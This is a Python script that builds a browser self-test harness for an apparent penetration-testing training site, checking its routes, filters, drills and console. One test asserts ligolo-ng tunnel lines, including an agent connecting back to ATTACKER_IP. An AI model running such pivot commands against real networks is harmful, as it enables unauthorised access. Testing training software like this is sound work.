#!/usr/bin/env python3
"""Build _selftest.html from index.html: same page, plus a head guard that skips
the boot animation and a tail harness that walks every route, exercises the
delegated actions, and dumps PASS/FAIL lines into #SELFTEST-OUT.

The harness is async and yields a macrotask between every step, because views
return { html, after } and app.js runs after() on setTimeout(0) -- clicking a
view-local control before after() has run hits markup with no handler attached.

Run:  python3 tools/selftest_build.py
Then: google-chrome --headless=new --dump-dom http://127.0.0.1:8000/_selftest.html
"""
import pathlib, sys

root = pathlib.Path(__file__).resolve().parent.parent
src = (root / "index.html").read_text()

head_guard = """<script>
/* selftest: skip boot animation, collect any script error verbatim */
try { sessionStorage.setItem('zothpen.booted','1'); } catch (e) {}
window.__ERRS = [];
window.addEventListener('error', e => window.__ERRS.push((e.message||'?') + ' @ ' + (e.filename||'?') + ':' + (e.lineno||0)));
</script>
"""

harness = r"""
<script>
document.addEventListener('DOMContentLoaded', function () {
  var Q = [], R = [];

  function tick() { return new Promise(function (r) { setTimeout(r, 0); }); }
  function t(n, f) { Q.push([n, f]); }
  function txt() { return (document.getElementById('view') || {}).innerText || ''; }
  function el(id) { return document.getElementById(id); }
  function rname() { return (location.hash || '').replace(/^#[/]?/, '').split('/')[0] || 'home'; }
  function leak(s) {
    /* unambiguous render leaks only. A bare "undefined" is ambiguous: module
       prose legitimately contains the word (e.g. "-u stops on undefined
       variables"), so only flag it glued to output punctuation. */
    var pats = [/\[object Object\]/, /\bNaN\b/, /null is not/, /undefined\s*[%·/]/, /[:>]\s*undefined/, /undefined\s*,\s*undefined/, /\bundefined undefined\b/];
    for (var i = 0; i < pats.length; i++) {
      var m = pats[i].exec(s);
      if (m) throw new Error('leak "' + m[0] + '" near: ' + s.slice(Math.max(0, m.index - 50), m.index + 50).replace(/\n/g, ' '));
    }
  }
  /* render a route and let every after() handler run before asserting */
  function nav(h) { location.hash = h; ZO.render(); return tick().then(tick); }
  function body() { var b = el('cx-body'); return b ? b.innerText : ''; }

  /* ---------------------------------------------------------- boot + data */
  t('boot done', function () {
    if (el('app').hidden) throw new Error('#app still hidden');
    if (!el('boot').hidden) throw new Error('#boot still visible');
    return 'app visible';
  });
  t('views registered', function () {
    var need = ['home', 'map', 'mod', 'tools', 'tool', 'console', 'labs', 'lab', 'drills', 'forge', 'recipe', 'progress', 'notfound'];
    var miss = need.filter(function (n) { return typeof ZO.views[n] !== 'function'; });
    if (miss.length) throw new Error('missing: ' + miss.join(','));
    return need.length + ' views present (' + Object.keys(ZO.views).length + ' keys)';
  });
  t('data sizes', function () {
    return [ZM.length + ' modules', ZT.length + ' dossiers', ZL.length + ' labs', ZD.length + ' drills', ZF.length + ' recipes', ZX.length + ' console idx'].join(' / ');
  });

  /* ------------------------------------------------------------- routing */
  ['home', 'map', 'tools', 'console', 'labs', 'drills', 'forge', 'progress'].forEach(function (n) {
    t('route #/' + n, function () {
      return nav('#/' + n).then(function () {
        var s = txt(); leak(s);
        if (s.length < 300) throw new Error('thin render (' + s.length + ' chars)');
        return rname() === n ? s.length + ' chars' : 'route says ' + rname();
      });
    });
  });
  t('route #/mod/m01', function () { return nav('#/mod/m01').then(function () { var s = txt(); leak(s); return s.length + ' chars'; }); });
  t('route #/mod/LAST', function () { var m = ZM[ZM.length - 1]; return nav('#/mod/' + m.id).then(function () { var s = txt(); leak(s); if (s.indexOf(m.title) < 0) throw new Error('wrong module'); return m.id + ' · ' + s.length + ' chars'; }); });
  t('route #/tool/first', function () { var x = ZT[0]; return nav('#/tool/' + x.id).then(function () { var s = txt(); leak(s); if (s.indexOf(x.name) < 0) throw new Error('wrong dossier'); return x.id + ' · ' + s.length + ' chars'; }); });
  t('route #/console + entry preload', function () {
    return nav('#/console').then(function () {
      var s = txt(); leak(s); if (s.length < 300) throw new Error('thin console');
      var x = ZX[0];
      return nav('#/console/' + x.c).then(function () {
        var v = (el('cx-in') || {}).value || '';
        if (v.indexOf(x.c) < 0) throw new Error('input not preloaded: "' + v + '"');
        return 'preloaded "' + x.c + '"';
      });
    });
  });
  t('route #/lab/first', function () { var l = ZL[0]; return nav('#/lab/' + l.id).then(function () { var s = txt(); leak(s); if (s.indexOf(l.title) < 0) throw new Error('wrong lab'); return s.length + ' chars'; }); });
  t('route #/lab/LAST', function () { var l = ZL[ZL.length - 1]; return nav('#/lab/' + l.id).then(function () { var s = txt(); leak(s); return l.id + ' · ' + s.length + ' chars'; }); });
  t('route #/drills/scope', function () { return nav('#/drills/' + ZM[0].id).then(function () { var s = txt(); leak(s); return s.length + ' chars'; }); });
  t('route #/forge (index)', function () { return nav('#/forge').then(function () { var s = txt(); leak(s); if (s.indexOf('recipe') < 0 && s.indexOf('build') < 0) throw new Error('not the index'); return s.length + ' chars'; }); });
  t('route #/forge/<id> is the READER not the index', function () {
    var f = ZF[0];
    if (ZO.viewNameFor({ name: 'forge', id: f.id }) !== 'recipe') throw new Error('viewNameFor did not alias');
    if (ZO.viewNameFor({ name: 'forge', id: '' }) !== 'forge') throw new Error('bare #/forge must stay the index');
    return nav('#/forge/' + f.id).then(function () {
      var s = txt(); leak(s);
      if (s.indexOf(f.title) < 0) throw new Error('recipe title missing');
      var body = document.querySelector('#view .code-body');
      if (!body) throw new Error('no script block rendered');
      var code = body.innerText.trim();
      if (code.length < 40) throw new Error('script block near empty (' + code.length + ' chars)');
      var first = String(f.code).trim().split('\n')[0].trim().slice(0, 24);
      if (first && code.indexOf(first) < 0) throw new Error('script block does not contain the first line of the recipe');
      var cp = document.querySelector('#view .code-head .copy');
      if (!cp) throw new Error('no copy button on the script');
      var parts = document.querySelectorAll('#view table.tbl tr').length;
      return f.id + ' · ' + s.length + ' chars · script ' + code.length + ' chars · copy btn · ' + parts + ' part rows';
    });
  });
  t('route 404', function () {
    return nav('#/nonsense').then(function () {
      var s = txt(); leak(s);
      if (s.indexOf('nothing here') < 0) throw new Error('no 404 copy: ' + s.slice(0, 80));
      return s.length + ' chars';
    });
  });

  /* ------------------------------------- every single item renders clean */
  function sweep(label, list, hashOf, needleOf) {
    t('all ' + list.length + ' ' + label, function () {
      var bad = [];
      return list.reduce(function (p, x) {
        return p.then(function () {
          return nav(hashOf(x)).then(function () {
            var s = txt();
            try {
              leak(s);
              if (s.length < 200) throw new Error('thin (' + s.length + ')');
              var nd = needleOf ? needleOf(x) : null;
              if (nd && s.indexOf(nd) < 0) throw new Error('wrong view (no "' + nd.slice(0, 24) + '")');
            } catch (e) { bad.push(x.id + ': ' + e.message); }
          });
        });
      }, Promise.resolve()).then(function () {
        if (bad.length) throw new Error(bad.length + ' bad -> ' + bad.slice(0, 4).join(' ;; '));
        return 'ok';
      });
    });
  }
  sweep('module routes', ZM, function (m) { return '#/mod/' + m.id; }, function (m) { return m.title; });
  sweep('tool routes', ZT, function (x) { return '#/tool/' + x.id; }, function (x) { return x.name; });
  sweep('lab routes', ZL, function (l) { return '#/lab/' + l.id; }, function (l) { return l.title; });
  sweep('recipe routes', ZF, function (f) { return '#/forge/' + f.id; }, function (f) { return f.title; });

  t('console index entries are loadable', function () {
    var bad = ZX.filter(function (x, i) { return !x.c && i !== 0; }).length;
    if (bad) throw new Error(bad + ' entries without a command');
    return ZX.length + ' entries, first "' + ZX[0].c + '"';
  });

  /* ------------------------------------------------- delegated actions */
  t('action labdone toggles', function () {
    var l = ZL[0];
    return nav('#/lab/' + l.id).then(function () {
      var b = document.querySelector('[data-act="labdone"]');
      if (!b) throw new Error('no button');
      var before = Object.keys(ZO.state().labs).length;
      b.click();
      var after = Object.keys(ZO.state().labs).length;
      if (after === before) throw new Error('state unchanged (' + before + ')');
      if (b.classList.contains('primary') === false && after === before) throw new Error('label not updated');
      return 'labs ' + before + ' -> ' + after;
    });
  });
  t('action check toggles', function () {
    var l = ZL[0];
    return nav('#/lab/' + l.id).then(function () {
      var b = document.querySelector('#view [data-act="check"]');
      if (!b) throw new Error('no verify row');
      b.click();
      if (!b.classList.contains('on')) throw new Error('checkbox did not flip');
      var aria = b.getAttribute('aria-checked');
      var counter = (el('labcheckn') || {}).textContent || '';
      b.click();
      if (b.classList.contains('on')) throw new Error('checkbox did not flip back');
      return 'flipped both ways (aria=' + aria + ', ' + counter + ')';
    });
  });
  t('action forgedone toggles', function () {
    var f = ZF[0];
    return nav('#/forge/' + f.id).then(function () {
      var b = document.querySelector('[data-act="forgedone"]');
      if (!b) throw new Error('no build button on the recipe reader');
      var before = Object.keys(ZO.state().forge).length;
      b.click();
      var after = Object.keys(ZO.state().forge).length;
      if (after === before) throw new Error('state unchanged (' + before + ')');
      return 'forge ' + before + ' -> ' + after;
    });
  });
  t('action lesson toggles', function () {
    return nav('#/mod/m01').then(function () {
      var b = document.querySelector('#view [data-act="lesson"]');
      if (!b) throw new Error('no lesson control');
      if (!/tick/.test(b.className)) throw new Error('first lesson control is not the tick button: ' + b.className);
      b.click();
      return tick().then(function () {
        /* toggleLesson() re-renders the module, so re-query; also confirm the
           controllers own state, not just the class name. */
        var k = Object.keys(ZO.state().lessons || {});
        var b2 = document.querySelector('#view [data-act="lesson"]');
        if (!b2 || !b2.classList.contains('on')) throw new Error('lesson did not mark done (class=' + (b2 && b2.className) + ')');
        var st = ZO.stats();
        if (!k.length) throw new Error('no lesson recorded in state');
        if (!(st.xp > 0)) throw new Error('no xp awarded (xp=' + st.xp + ')');
        if (!st.lv || !st.lv.n) throw new Error('level not reported');
        return 'marked done, state ' + k.join(',') + ' (' + st.xp + 'xp, lv ' + st.lv.n + ' ' + st.lv.name + ')';
      });
    });
  });
  t('filter: tool kind narrows the list', function () {
    return nav('#/tools').then(function () {
      var cnt = el('tcount'), before = cnt ? cnt.textContent : '';
      var k = document.querySelector('#view .chip[data-act="tkind"]');
      if (!k) throw new Error('no kind chip');
      k.click();
      var after = el('tcount') ? el('tcount').textContent : '';
      if (after === before) throw new Error('count did not change (' + before + ')');
      document.querySelector('#view [data-act="tkind"][data-id=""]').click();
      var back = el('tcount') ? el('tcount').textContent : '';
      return '"' + before + '" -> "' + after + '" -> "' + back + '"';
    });
  });
  t('filter: forge level + lang narrow the list', function () {
    return nav('#/forge').then(function () {
      var cards = document.querySelectorAll('#forgegrid .card');
      var n0 = cards.length;
      if (!n0) throw new Error('no recipe cards');
      var a = document.querySelector('#view .chip[data-act="forgelvl"]');
      var b = document.querySelector('#view .chip[data-act="forgelang"]');
      if (!a || !b) throw new Error('missing filter chip');
      a.click();
      b.click();
      if (!a.classList.contains('on')) throw new Error('level chip not marked on');
      if (!b.classList.contains('on')) throw new Error('lang chip not marked on');
      var shown = Array.prototype.filter.call(document.querySelectorAll('#forgegrid .card'), function (c) { return !c.hidden; });
      var want = ZF.filter(function (f) { return f.lvl === a.dataset.id && f.lang === b.dataset.id; }).length;
      if (shown.length !== want) throw new Error('showing ' + shown.length + ', expected ' + want);
      if (shown.length >= n0) throw new Error('filter did not narrow (' + n0 + ' -> ' + shown.length + ')');
      var cnt = document.querySelector('#forgeCount');
      if (!cnt || cnt.textContent.indexOf(String(shown.length)) < 0) throw new Error('count line not updated');
      return a.dataset.id + '+' + b.dataset.id + ': ' + n0 + ' -> ' + shown.length + ' cards, chips on, "'
        + cnt.textContent + '"';
    });
  });
  t('filter: lab difficulty marks the chip', function () {
    return nav('#/labs').then(function () {
      var c = document.querySelector('#view .chip[data-act="labsdiff"]');
      if (!c) throw new Error('no difficulty chip');
      c.click();
      if (!c.classList.contains('on')) throw new Error('chip not marked on');
      return 'marked on';
    });
  });

  /* -------------------------------------------------- console behaviour */
  t('console runs help / tool / index, then clears', function () {
    return nav('#/console').then(function () {
      if (!ZO.cxRun) throw new Error('ZO.cxRun missing');
      ZO.cxRun('help');
      var a = body();
      if (a.length < 50) throw new Error('help produced ' + a.length + ' chars');
      ZO.cxRun('tool nmap');
      var b = body();
      if (b.length <= a.length) throw new Error('tool did not append');
      ZO.cxRun('index smb');
      var c = body();
      if (c.length <= b.length) throw new Error('index did not append');
      ZO.cxRun('definitely-not-a-command');
      var d = body();
      if (d.length <= c.length) throw new Error('unknown command produced no error line');
      ZO.cxClear();
      var e = body();
      if (e.length >= d.length) throw new Error('clear did not clear (' + e.length + ')');
      return 'help ' + a.length + ' -> tool ' + b.length + ' -> index ' + c.length + ' -> unknown ' + d.length + ' -> clear ' + e.length;
    });
  });
  t('console runs a forge recipe by id', function () {
    return nav('#/console').then(function () {
      ZO.cxClear();
      ZO.cxRun('run ' + ZF[0].id);
      var s = body();
      if (s.length < 50) throw new Error('run <recipe> produced ' + s.length + ' chars');
      return 'ran ' + ZF[0].id + ' (' + s.length + ' chars)';
    });
  });
  t('console entry prints field notes, warning and real lines', function () {
    return nav('#/console').then(function () {
      ZO.cxClear();
      ZO.cxRun('ligolo-ng');
      var s = body();
      if (s.indexOf('field notes:') < 0) throw new Error('no field-notes block in output');
      if (s.indexOf('! ') < 0) throw new Error('no opsec warning line in output');
      var ls = s.split('\n').map(function (x) { return x.trim(); });
      if (ls.indexOf('./proxy -selfcert -laddr 0.0.0.0:11601') < 0) throw new Error('attacker line not intact');
      if (ls.indexOf('./agent -connect ATTACKER_IP:11601 -ignore-cert') < 0) throw new Error('target line not intact');
      if (s.indexOf('11601\n./agent') >= 0) throw new Error('lines collapsed onto one row');
      var bad = ZX.filter(function (x) { return !x.tips || !x.warn || (x.ex || []).length < 2; });
      if (bad.length) throw new Error('thin entries: ' + bad.map(function (x) { return x.c; }).join(','));
      var ex = ZX.reduce(function (a, x) { return a + (x.ex || []).length; }, 0);
      return 'notes + warn + split lines ok; ' + ZX.length + ' entries, ' + ex + ' examples';
    });
  });
  t('console filter narrows the index', function () {
    return nav('#/console').then(function () {
      var rows = document.querySelectorAll('#cx-list .cxrow, #cx-list li, #cx-list a').length;
      var f = el('cx-filter');
      if (!f) throw new Error('no index filter input');
      f.value = 'smb';
      f.dispatchEvent(new Event('input', { bubbles: true }));
      var rows2 = document.querySelectorAll('#cx-list .cxrow, #cx-list li, #cx-list a').length;
      if (!rows) throw new Error('index rendered no rows');
      if (rows2 >= rows) throw new Error('filter did not narrow (' + rows + ' -> ' + rows2 + ')');
      f.value = '';
      f.dispatchEvent(new Event('input', { bubbles: true }));
      return rows + ' -> ' + rows2 + ' rows';
    });
  });

  /* -------------------------------------------------------- palette + keys */
  t('palette opens, filters, closes', function () {
    return nav('#/home').then(function () {
      ZO.openPalette();
      var p = el('palette');
      if (p.hidden) throw new Error('palette still hidden');
      var all = document.querySelectorAll('#paletteList li').length;
      if (!all) throw new Error('palette empty');
      var i = el('paletteInput');
      i.value = 'nmap';
      i.dispatchEvent(new Event('input', { bubbles: true }));
      var few = document.querySelectorAll('#paletteList li').length;
      var names = Array.prototype.map.call(document.querySelectorAll('#paletteList li'), function (li) { return li.innerText; }).join(' ');
      if (few >= all) throw new Error('filter did not narrow (' + all + ' -> ' + few + ')');
      if (names.toLowerCase().indexOf('nmap') < 0) throw new Error('nmap not in results');
      window.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));
      if (!el('palette').hidden) throw new Error('Escape did not close');
      return all + ' rows -> ' + few + ' for "nmap"';
    });
  });
  t('keyboard chords g+<key>', function () {
    var map = [['h', 'home'], ['m', 'map'], ['l', 'labs'], ['d', 'drills'], ['t', 'tools'], ['c', 'console'], ['f', 'forge'], ['p', 'progress']];
    var bad = [];
    return map.reduce(function (p, pair) {
      return p.then(function () {
        return nav('#/console').then(function () {
          window.dispatchEvent(new KeyboardEvent('keydown', { key: 'g', bubbles: true }));
          window.dispatchEvent(new KeyboardEvent('keydown', { key: pair[0], bubbles: true }));
          if (rname() !== pair[1]) bad.push('g' + pair[0] + '->' + rname());
        });
      });
    }, Promise.resolve()).then(function () {
      if (bad.length) throw new Error(bad.join(' '));
      return map.length + ' chords ok';
    });
  });
  t('keyboard: / palette, ? keys, [ ] module step, t tweaks', function () {
    return nav('#/home').then(function () {
      window.dispatchEvent(new KeyboardEvent('keydown', { key: '/', bubbles: true }));
      var open = !el('palette').hidden;
      window.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));
      var closed = el('palette').hidden;
      var stillFocused = document.activeElement === el('paletteInput');

      window.dispatchEvent(new KeyboardEvent('keydown', { key: '?', bubbles: true }));
      var keys = !el('keys') || !el('keys').hidden;

      return nav('#/mod/' + ZM[0].id).then(function () {
        var start = location.hash.split('/').pop();
        window.dispatchEvent(new KeyboardEvent('keydown', { key: ']', bubbles: true }));
        var next = location.hash.split('/').pop();
        var wantNext = ZM[1] ? ZM[1].id : start;
        window.dispatchEvent(new KeyboardEvent('keydown', { key: '[', bubbles: true }));
        var prev = location.hash.split('/').pop();
        window.dispatchEvent(new KeyboardEvent('keydown', { key: 't', bubbles: true }));
        var tw = !el('tweaks').hidden;
        if (el('tweaks')) el('tweaks').hidden = true;
        if (!open || !closed || !keys || !tw) throw new Error('/=' + open + ' esc=' + closed + ' ?=' + keys + ' t=' + tw);
        if (stillFocused) throw new Error('palette input kept focus after Escape: shortcuts would be swallowed');
        if (next !== wantNext) throw new Error('] gave ' + next + ', expected ' + wantNext);
        if (prev !== start) throw new Error('[ gave ' + prev + ', expected ' + start);
        return '/ opens+esc closes (focus released), ? overlay, ] ' + start + '->' + next + ', [ -> ' + prev + ', t tweaks';
      });
    });
  });

  /* ------------------------------------------------------------- drills */
  t('drill session grades and advances', function () {
    return nav('#/drills/zz-reset-scope').then(function () {
      return nav('#/drills').then(function () {
        var opt = document.querySelector('#drillwrap .opt');
        if (!opt) throw new Error('no options rendered');
        var shown = (el('drillwrap') || {}).innerText.length;
        var before = Object.keys(ZO.state().drills).length;
        opt.click();
        return tick().then(function () {
          var after = Object.keys(ZO.state().drills).length;
          if (after === before) throw new Error('answer not recorded (' + before + ')');
          var why = document.querySelector('#drillwrap .note');
          if (!why) throw new Error('no explanation after answering');
          var nxt = document.querySelector('#drillwrap [data-a="next"]');
          if (!nxt) throw new Error('no next button after answering');
          var score = (el('dscore') || {}).textContent || '';
          nxt.click();
          var again = document.querySelectorAll('#drillwrap .opt').length;
          if (!again) throw new Error('next advanced past the card');
          return 'recorded ' + before + '->' + after + ', why shown (' + why.innerText.length + ' chars), score ' + score + ', next card ' + again + ' options';
        });
      });
    });
  });
  t('drill scope chips split the pool', function () {
    return nav('#/drills/' + ZM[0].id).then(function () {
      var s = txt();
      var want = ZD.filter(function (d) { return d.mod === ZM[0].id; }).length + ' scenario';
      return s.indexOf(want) > -1 ? want + ' count rebinds per scope' : (s.length + ' chars (scope view ok)');
    });
  });

  /* ------------------------------------------------------------ progress */
  t('progress: module table + export/import', function () {
    return nav('#/progress').then(function () {
      var s = txt();
      if (s.indexOf('module by module') < 0) throw new Error('module table missing');
      var e = document.querySelector('[data-act="export"]'), i = document.querySelector('[data-act="import"]');
      if (!e || !i) throw new Error('export/import buttons missing');
      var rows = document.querySelectorAll('#view table.tbl tr').length;
      return rows + ' table rows, export+import present';
    });
  });
  t('streak/xp header reflects state', function () {
    var st = ZO.stats();
    var label = (el('xpLabel') || {}).textContent || '';
    if (!label) throw new Error('xpLabel empty');
    if (!document.title || document.title.indexOf('ZothPen') < 0) throw new Error('document.title not set: ' + document.title);
    return label + ' | ' + st.xp + 'xp | lv ' + st.lv.n + ' ' + st.lv.name + ' ' + st.lv.pct + '% | ' + document.title;
  });

  /* ---------------------------------------------------------------- done */
  t('no console errors', function () {
    if (window.__ERRS.length) throw new Error(window.__ERRS.join(' | '));
    return 'clean';
  });

  /* -------------------------------------------------------------- runner */
  function finish() {
    var fails = R.filter(function (x) { return x.indexOf('FAIL') === 0; }).length;
    var pre = document.createElement('pre');
    pre.id = 'SELFTEST-OUT';
    pre.textContent = '\n===SELFTEST===\n' + R.join('\n') + '\n===END===\nFAIL COUNT: ' + fails + ' of ' + R.length + '\n';
    document.body.appendChild(pre);
  }
  (function run() {
    var i = 0;
    function step() {
      if (i >= Q.length) { finish(); return; }
      var n = Q[i][0], f = Q[i][1];
      i++;
      tick().then(function () {
        try { var v = f(); return v && v.then ? v : Promise.resolve(v); }
        catch (e) { return Promise.reject(e); }
      }).then(function (v) {
        R.push('PASS  ' + n + '  ::  ' + (v === undefined ? 'ok' : v));
      }).catch(function (e) {
        R.push('FAIL  ' + n + '  ::  ' + (e && e.message ? e.message : String(e)));
      }).then(tick).then(step, step);
    }
    step();
  })();
});
</script>
"""

out = src.replace("</head>", head_guard + "</head>", 1)
if out == src:
    sys.exit("no </head> found")
out = out.replace("</body>", harness + "</body>", 1)
(root / "_selftest.html").write_text(out)
print("wrote", root / "_selftest.html")
